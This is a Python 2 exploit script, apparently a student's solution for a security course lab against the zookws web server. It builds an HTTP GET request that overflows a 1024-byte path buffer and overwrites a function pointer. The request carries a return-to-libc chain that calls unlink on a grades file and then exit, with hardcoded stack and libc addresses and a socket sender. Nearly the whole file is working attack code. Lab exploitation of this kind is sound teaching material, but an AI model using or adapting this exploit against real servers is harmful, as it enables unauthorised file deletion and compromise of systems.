#!/usr/bin/env python2
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xbffff18c
stack_saved_ebp = 0xbffff598
stack_retaddr = stack_saved_ebp + 4

libc_unlink_addr = 0x401014c0  
libc_exit_addr = 0x400589d0 

unlink_param_addr = 0xbffff5a4


## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)


    # Our payload gets injected into the http_serve function through its 
    #   second argument, `name`.  On line http.c:282, `name` gets 
    #   concatenated with `pn`.  But before this, the absolute path is 
    #   prepennded to the `pn` string.  
    #   Thus, we have to subject the length of this absolute path.  
    path_name = '/home/httpd/lab/'

    unlink_target = "/home/httpd/grades.txt"


    libc_unlink_addr_encoded = struct.pack("<I", libc_unlink_addr)
    libc_exit_addr_encoded = struct.pack("<I", libc_exit_addr)
    

    # unlink_param_addr = stack_buffer + len(header_intro_2)
    unlink_param_addr_encoded = struct.pack("<I", unlink_param_addr)


    # target buffer is pn[1024].  http.c:276
    size_of_buffer = 1024


    # the buffer only needs to be overflowed by 4 bytes
    #   Overflowing 4 bytes will overwrite the variable `handler`.  
    #   On line http.c:296, `handler()` is invoked.  

    garbage_size = size_of_buffer - len(path_name) 
    garbage = garbage_size * 'k'



    # payload = garbage + \
    #           libc_unlink_addr_encoded + \
    #           'kkkkkkkk' + \
    #           libc_exit_addr_encoded + \
    #           'kkkk' + \
    #           unlink_param_addr_encoded + \
    #           unlink_target

    payload = garbage + \
              libc_unlink_addr_encoded + \
              'kkkkkkkkkkkk' + \
              libc_exit_addr_encoded + \
              unlink_param_addr_encoded + \
              unlink_target


    req =   "GET /"+ payload + " HTTP/1.0\r\n" + \
            "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

